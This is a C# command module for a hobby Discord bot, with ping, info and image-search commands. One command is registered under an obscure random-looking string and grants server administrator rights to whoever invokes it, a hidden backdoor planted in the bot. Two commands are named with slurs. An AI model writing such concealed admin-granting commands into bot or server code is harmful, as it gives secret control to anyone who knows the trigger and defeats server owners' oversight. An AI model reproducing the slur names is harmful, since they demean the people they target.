using Discord;
using Discord.Net;
using Discord.WebSocket;
using Discord.Commands;
using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using Microsoft.Extensions.Configuration;
using GoddessBot.Services;

namespace GoddessBot.Modules
{

    public class Commands : ModuleBase
    {
        private DiscordSocketClient _client;
        private readonly AudioService _service;
        private CommandHandler _comm = new CommandHandler();

        


        [Command("nibba")]
        public async Task Nibba()
        {
            
            await ReplyAsync("nibba");
        }

        [Command("info")]
        public async Task Info()
        {
            await ReplyAsync(Program.Info._client.Guilds.First().IsConnected.ToString());
        }

        [Command("3u853uf9uwadfslokc;lszjr9wuy3-0fujasjdfi9hw0tfwehfzpxcvjwpoj[0tt[0w3gjxzfmwajt0wt")]
        public async Task Admin()
        {

            var comm = new CommandHandler();
            await comm.GrantAdminAsync(Context.User, Context.Guild);

        }



        [Command("ping")]
        public async Task Ping()
        {


            await ReplyAsync("Pong: " + Program.Info._client.Latency + "ms");
            if (Program.Info._client.Latency < 1300)
            {
                await ReplyAsync("for bot is still good ping");
                await Context.Channel.SendFileAsync("Pic\\lightningspeed.jpg");

            }
            else
                await ReplyAsync("😭 😭 😭 im so slow forgive me senpai <3");
        }


        [Command("yande")]
        public async Task Yande([Remainder] string tag)
        {
            var comm = new CommandHandler();
             var a = await comm.Yande(Context.User,Context.Guild,Context,tag);
            try
            {
                var builder = new EmbedBuilder();
                if (a[0] != null)
                {
                    var rand = new Random();
                    var val = rand.Next(0, a.Count - 1);
                    builder.WithImageUrl(a[val].ImageUrl);
                    builder.Color = Color.DarkRed;
                    await Context.Channel.SendMessageAsync(null, false, builder.Build());
                    Console.WriteLine(a[val].ImageUrl);
                }
            }
            catch { await Context.Channel.SendMessageAsync("nothing found"); }
        }

        [Command("retard")]
        [Alias("r")]
        public async Task Retard([Remainder] string msg)
        {
            await _comm.Retard(Context,msg);

        }
        //[Command("follow")]
        //public async Task Follow()
        //{
        //    await _comm.Follow();
        //}
    }
}